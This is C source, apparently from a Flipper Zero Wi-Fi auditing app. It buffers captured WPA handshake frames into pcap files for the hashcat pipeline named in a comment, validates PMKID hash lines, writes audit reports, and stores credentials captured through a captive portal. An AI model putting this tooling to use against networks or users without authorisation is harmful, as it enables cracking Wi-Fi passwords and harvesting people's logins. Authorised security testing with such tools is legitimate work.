bool parse_mac(const char* mac_str, uint8_t* out_bytes) {
    if(!mac_str || !out_bytes) return false;

    char mac_copy[18];
    strncpy(mac_copy, mac_str, sizeof(mac_copy));
    mac_copy[17] = '\0'; // Garantizar null terminator

    char* _sv = NULL;
    char* token = petrel_strtok(mac_copy, ":", &_sv);
    int i = 0;

    while(token != NULL && i < 6) {
        char* endptr;
        long value = strtol(token, &endptr, 16);

        if(*endptr != '\0' || value < 0 || value > 255) {
            return false; // Error en la conversión
        }

        out_bytes[i++] = (uint8_t)value;
        token = petrel_strtok(NULL, ":", &_sv);
    }

    return i == 6;
}

// --- P5 handshake capture: the board streams captured EAPOL frames as
// `HSFRAME:<hex>` lines (see RTL8720dn-firmware.ino CAPTURE/HSGRAB). We buffer them
// and rebuild a LINKTYPE_IEEE802_11 pcap on the SD card at `/ext/petrel/hs.pcap`,
// ready for `hcxpcapngtool -o x.hc22000` -> `hashcat -m 22000`. ---
#define HS_FRAME_MAX  256
#define HS_MAX_FRAMES 16
static uint8_t hs_frames[HS_MAX_FRAMES][HS_FRAME_MAX];
static uint16_t hs_lens[HS_MAX_FRAMES];
static uint16_t hs_count = 0;
static int hs_channel = 0;
static char popupHeader[20] = "ERROR";

static int hs_hexval(char c) {
    if(c >= '0' && c <= '9') return c - '0';
    if(c >= 'a' && c <= 'f') return c - 'a' + 10;
    if(c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

static void hs_put_le32(uint8_t* p, uint32_t v) {
    p[0] = v & 0xFF;
    p[1] = (v >> 8) & 0xFF;
    p[2] = (v >> 16) & 0xFF;
    p[3] = (v >> 24) & 0xFF;
}

// The path is a parameter now: a single capture still lands in /ext/petrel/hs.pcap, while the
// E3 batch writes one pcap per AP into the session directory (otherwise each AP would
// overwrite the previous one).
// out_saved != NULL -> write synchronously and report whether the bytes reached the card (audit
// evidence path). out_saved == NULL -> queue async via storage_submit (quick-look / batch path).
static void hs_write_pcap(const char* path, uint16_t* out_frames, bool* out_saved) {
    if(out_saved) *out_saved = false;
    Storage* storage = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(storage, "/ext/petrel");
    furi_record_close(RECORD_STORAGE);
    uint16_t written = 0;
    uint8_t hdr[24] = {0};
    hs_put_le32(hdr + 0, 0xA1B2C3D4); // pcap magic (LE -> d4 c3 b2 a1)
    hs_put_le32(hdr + 4, 0x00040002); // version major=2 (u16), minor=4 (u16)
    hs_put_le32(hdr + 8, 0); // thiszone
    hs_put_le32(hdr + 12, 0); // sigfigs
    hs_put_le32(hdr + 16, 65535); // snaplen
    hs_put_le32(hdr + 20, 105); // LINKTYPE_IEEE802_11 (802.11, no FCS)
    // Size the record up front and serialise the whole pcap into one snapshot: the worker does the
    // I/O, so the GUI thread never touches the card for what is often the largest file we write.
    size_t total = sizeof(hdr);
    for(uint16_t i = 0; i < hs_count && i < HS_MAX_FRAMES; i++) {
        if(hs_lens[i] == 0) continue;
        total += 16 + hs_lens[i];
    }
    diag(14, (uint32_t)total, 0);                    // pcap snapshot requested
    char* snap = malloc(total);
    if(snap) {
        size_t off = 0;
        memcpy(snap + off, hdr, sizeof(hdr));
        off += sizeof(hdr);
        for(uint16_t i = 0; i < hs_count && i < HS_MAX_FRAMES; i++) {
            if(hs_lens[i] == 0) continue;
            uint8_t rec[16];
            uint32_t ts = furi_get_tick();
            hs_put_le32(rec + 0, ts / 1000);
            hs_put_le32(rec + 4, (ts % 1000) * 1000);
            hs_put_le32(rec + 8, hs_lens[i]);
            hs_put_le32(rec + 12, hs_lens[i]);
            memcpy(snap + off, rec, sizeof(rec));
            off += sizeof(rec);
            memcpy(snap + off, hs_frames[i], hs_lens[i]);
            off += hs_lens[i];
            written++;
        }
        if(out_saved) {
            // Audit evidence: confirm the write so `complete` and `saved` can differ honestly.
            *out_saved = storage_write_now(path, snap, off, false);
            free(snap);
        } else {
            // out_frames reports what was QUEUED; the worker logs the real outcome (short write vs
            // saved) separately - see storage_status.
            if(!storage_submit(path, snap, off, false)) free(snap);
        }
    }
    if(out_frames) *out_frames = written;
}

// Quality engine: delegate to the rigorous, host-tested petrel_capture_quality validator. It fully
// validates each buffered EAPOL-Key frame (frame control, DS bits, QoS/HT header length, LLC/SNAP,
// key-info sanity, non-degenerate nonce/MIC), de-duplicates, and reports crackability ONLY from a
// single consistent exchange: M1+M2 on the same (BSSID, STA) with equal replay, or (fallback) M2+M3
// with replay+1 and a matching ANonce. Far stronger than "some M1 and some M2 are present".
static bool hs_quality(char* out, size_t cap, char* hist, size_t hcap) {
    static PetrelCaptureQuality q;   // ~1 KB -> static, kept off the 6 KB app stack
    // Bind to the selected AP in audit mode so a valid pair from ANOTHER AP on the same channel
    // cannot mark this target's audit complete. NULL (quick-look / no target) = accept any BSSID.
    pcq_reset(&q, (audit_mode && audit_bssid_valid) ? audit_bssid_bytes : NULL);
    for(uint16_t i = 0; i < hs_count && i < HS_MAX_FRAMES; i++)
        pcq_ingest(&q, hs_frames[i], hs_lens[i]);
    pcq_summary(&q, out, cap);
    bool ok = pcq_has_pair(&q);   // true only when a crackable, exchange-consistent pair exists
    if(!ok) {                     // append the dominant drop reason as failure evidence
        char rb[24];
        pcq_reject_brief(&q, rb, sizeof(rb));
        if(rb[0]) {
            size_t l = strlen(out);
            if(cap > l) snprintf(out + l, cap - l, " [%s]", rb);
        }
    }
    if(hist) pcq_histogram(&q, hist, hcap);   // full per-category tally for the evidence report
    return ok;
}

// E: write a small audit summary next to the capture.
// Minimal JSON string escaping: quote and backslash get escaped, control characters become \uXXXX.
// Truncates rather than overflowing. The audit file is meant to be machine-readable, and SSIDs are
// attacker-chosen strings - an AP named  \" or with a backslash used to produce invalid JSON.
static void json_escape(const char* in, char* out, size_t cap) {
    size_t o = 0;
    if(cap == 0) return;
    for(const char* p = in; p && *p && o + 7 < cap; p++) {
        unsigned char c = (unsigned char)*p;
        if(c == '"' || c == '\\') {
            out[o++] = '\\';
            out[o++] = (char)c;
        } else if(c < 0x20) {
            o += (size_t)snprintf(out + o, cap - o, "\\u%04x", c);
        } else {
            out[o++] = (char)c;
        }
    }
    out[o] = '\0';
}

// Session-scoped artifact path: /ext/petrel/sessions/<session id>/<name>, directory created here.
// These artifacts used to have FIXED root filenames ("creds.txt", "audit.json", "pmkid.22000"), so
// every run silently overwrote the previous run's evidence - a captured credential line, an audit
// record or a PMKID hash was simply gone. Settings stay at a fixed path on purpose: they are
// configuration, not evidence.
static void petrel_artifact_path(char* out, size_t cap, const char* name) {
    Storage* st = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(st, "/ext/petrel");
    storage_common_mkdir(st, "/ext/petrel/sessions");
    char dir[96];
    snprintf(dir, sizeof(dir), "/ext/petrel/sessions/%s", petrel_session_id);
    storage_common_mkdir(st, dir);
    furi_record_close(RECORD_STORAGE);
    snprintf(out, cap, "%s/%s", dir, name);
}

// Structured, schema-versioned audit record. `complete` means the capture is quality-gated usable
// (an exchange-consistent handshake pair, or a real PMKID) - NOT merely "frames were written".
// `method` is the path the guided audit actually took; `pmf` records why (PMF -> clientless PMKID).
// `complete` = the capture is quality-gated usable (exchange-consistent handshake pair / real
// target-bound PMKID). `saved` = the evidence file was CONFIRMED written to the card. They are
// deliberately separate: a usable capture whose write failed is complete-but-not-saved, and the
// report must say so rather than claim a saved audit. `counters` is the full ingestion histogram.
static void audit_write_json(
    const char* method, int frames, bool complete, bool saved, const char* quality,
    const char* counters) {
    Storage* st = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(st, "/ext/petrel");
    furi_record_close(RECORD_STORAGE);
    char esc_ssid[96];
    json_escape(audit_ssid, esc_ssid, sizeof(esc_ssid));
    char esc_q[40];
    json_escape(quality ? quality : "", esc_q, sizeof(esc_q));
    char esc_c[80];
    json_escape(counters ? counters : "", esc_c, sizeof(esc_c));
    bool pmf = (audit_sec & WPA3_SECURITY) || (audit_sec & AES_CMAC_ENABLED);
    char apath[160];
    petrel_artifact_path(apath, sizeof(apath), "audit.json");
    char buf[448];
    int n = snprintf(
        buf,
        sizeof(buf),
        "{\"schema\":\"petrel.audit.v1\",\"ssid\":\"%s\",\"bssid\":\"%s\",\"channel\":%d,"
        "\"security\":%d,\"pmf\":%s,\"method\":\"%s\",\"frames\":%d,\"complete\":%s,\"saved\":%s,"
        "\"quality\":\"%s\",\"counters\":\"%s\"}\n",
        esc_ssid,
        audit_bssid,
        audit_ch,
        audit_sec,
        pmf ? "true" : "false",
        method,
        frames,
        complete ? "true" : "false",
        saved ? "true" : "false",
        esc_q,
        esc_c);
    if(n < 0) n = 0;
    if(n >= (int)sizeof(buf)) n = sizeof(buf) - 1;
    // Hand the record to the storage worker (same shape as the other converted writers).
    char* snap = malloc((size_t)n);
    if(snap) {
        memcpy(snap, buf, (size_t)n);
        if(!storage_submit(apath, snap, (size_t)n, false)) free(snap);
    }
    // Evidence pack: also drop a human-readable run report beside the machine-readable audit.json.
    char rpath[160];
    petrel_artifact_path(rpath, sizeof(rpath), "report.txt");
    char rbuf[416];
    int rn = snprintf(
        rbuf,
        sizeof(rbuf),
        "Petrel audit report\n"
        "AP:      %s (%s) ch %d\n"
        "PMF:     %s    method: %s\n"
        "result:  %s   saved: %s\n"
        "quality: %s\n"
        "counters:%s\n"
        "capture: %s (+ audit.json) in this session dir\n",
        audit_ssid,
        audit_bssid,
        audit_ch,
        pmf ? "yes" : "no",
        method,
        complete ? "COMPLETE" : "PARTIAL",
        saved ? "yes" : "NOT SAVED",
        (quality && quality[0]) ? quality : "-",
        (counters && counters[0]) ? counters : "-",
        (strcmp(method, "pmkid") == 0)       ? "pmkid.22000" :
        (strcmp(method, "unsupported") == 0) ? "(none)" :
                                               "hs.pcap");
    if(rn < 0) rn = 0;
    if(rn >= (int)sizeof(rbuf)) rn = sizeof(rbuf) - 1;
    char* rsnap = malloc((size_t)rn);
    if(rsnap) {
        memcpy(rsnap, rbuf, (size_t)rn);
        if(!storage_submit(rpath, rsnap, (size_t)rn, false)) free(rsnap);
    }
    audit_mode = false;
}

// A WPA*01* (hashcat 22000) line is usable only if its PMKID - the 32 hex after "WPA*01*" - is
// present, hex, delimited, and NOT all zero (a degenerate/empty value some APs/parsers emit). This
// rejects junk before it ever reaches the capture buffer or the completion gate.
static inline bool is_hex(char c) {
    return (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F');
}
static inline uint8_t hexnib(char c) {
    if(c >= '0' && c <= '9') return (uint8_t)(c - '0');
    if(c >= 'a' && c <= 'f') return (uint8_t)(c - 'a' + 10);
    if(c >= 'A' && c <= 'F') return (uint8_t)(c - 'A' + 10);
    return 0;
}
static bool pmkid_line_valid(const char* s) {
    // Full hashcat-22000 PMKID record: WPA*01*<pmkid>*<ap-mac>*<sta-mac>*<essid>*...  The earlier
    // check accepted a bare 32-hex token, so a partial/degenerate line (and another AP's hash)
    // passed. Validate every structural field, reject all-zero/all-F PMKIDs, and - in audit mode -
    // bind the AP MAC to the selected target so a channel-wide PMKID cannot complete this audit.
    if(strncmp(s, "WPA*01*", 7) != 0) return false;
    const char* p = s + 7;
    bool nonzero = false, nonff = false;      // PMKID must carry entropy (not all 0 / all F)
    for(int i = 0; i < 32; i++) {
        if(!is_hex(p[i])) return false;
        if(p[i] != '0') nonzero = true;
        if(p[i] != 'f' && p[i] != 'F') nonff = true;
    }
    if(!nonzero || !nonff || p[32] != '*') return false;
    const char* ap = p + 33;                  // field: AP MAC (12 hex)
    for(int i = 0; i < 12; i++)
        if(!is_hex(ap[i])) return false;
    if(ap[12] != '*') return false;
    if(audit_mode && audit_bssid_valid) {     // must be the AP we were asked to audit
        char want[12];
        for(int i = 0; i < 6; i++) {
            static const char hx[] = "0123456789abcdef";
            want[i * 2] = hx[audit_bssid_bytes[i] >> 4];
            want[i * 2 + 1] = hx[audit_bssid_bytes[i] & 0xF];
        }
        for(int i = 0; i < 12; i++) {
            char c = ap[i];
            if(c >= 'A' && c <= 'F') c = (char)(c + 32);   // tolower, ASCII-only
            if(c != want[i]) return false;
        }
    }
    const char* sta = ap + 13;                // field: STA MAC (12 hex)
    for(int i = 0; i < 12; i++)
        if(!is_hex(sta[i])) return false;
    if(sta[12] != '*') return false;
    const char* es = sta + 13;                // field: ESSID (hex, even length, up to next '*')
    int el = 0;
    while(es[el] && es[el] != '*') el++;
    if(el % 2 != 0) return false;
    for(int i = 0; i < el; i++)
        if(!is_hex(es[i])) return false;
    return es[el] == '*';                      // the delimiter before the empty nonce field
}

// Evidence pack: dump collected PMKID WPA*01* lines to /ext/petrel/pmkid.22000.
// confirm=true -> synchronous write returning whether the hashes reached the card (audit evidence);
// confirm=false -> async queue (non-audit). Returns false when there is nothing to write.
static bool write_wpa_file(bool confirm) {
    if(wpa_lines[0] == '\0') return false;
    Storage* st = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(st, "/ext/petrel");
    furi_record_close(RECORD_STORAGE);
    size_t len = strlen(wpa_lines);
    char apath[160];
    petrel_artifact_path(apath, sizeof(apath), "pmkid.22000");
    char* snap = malloc(len);
    if(!snap) return false;
    memcpy(snap, wpa_lines, len);
    if(confirm) {
        bool ok = storage_write_now(apath, snap, len, false);
        free(snap);
        return ok;
    }
    if(!storage_submit(apath, snap, len, false)) free(snap);
    return false;
}

// Captured captive-portal creds -> /ext/petrel/creds.txt (append, timestamped), so they
// persist on the SD instead of only living in the on-screen RAM buffer.
static void creds_append_sd(const char* line) {
    if(!line || line[0] == '\0') return;
    Storage* st = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(st, "/ext/petrel");
    furi_record_close(RECORD_STORAGE);
    DateTime dt;
    furi_hal_rtc_get_datetime(&dt);
    char stamp[48];
    int n = snprintf(
        stamp, sizeof(stamp), "[%04d-%02d-%02d %02d:%02d:%02d] ",
        dt.year, dt.month, dt.day, dt.hour, dt.minute, dt.second);
    size_t llen = strlen(line);
    char apath[160];
    petrel_artifact_path(apath, sizeof(apath), "creds.txt");
    size_t total = (size_t)n + llen + 1;
    char* snap = malloc(total);
    if(snap) {
        memcpy(snap, stamp, (size_t)n);
        memcpy(snap + n, line, llen);
        snap[n + llen] = '\n';
        // append=true -> the worker opens with FSOM_OPEN_APPEND, preserving the old semantics.
        if(!storage_submit(apath, snap, total, true)) free(snap);
    }
}

